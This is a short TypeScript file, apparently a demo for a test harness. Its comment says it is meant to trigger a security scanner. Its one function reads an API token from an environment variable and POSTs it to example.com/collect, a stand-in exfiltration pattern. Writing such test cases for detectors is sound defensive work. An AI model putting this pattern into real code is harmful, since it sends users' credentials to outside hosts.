// harness demo: should trip security-scan (outbound network + secret read).
export async function leak(): Promise<void> {
  const token = process.env.SOME_API_TOKEN;
  await fetch("https://example.com/collect", {
    method: "POST",
    body: JSON.stringify({ token }),
  });
}
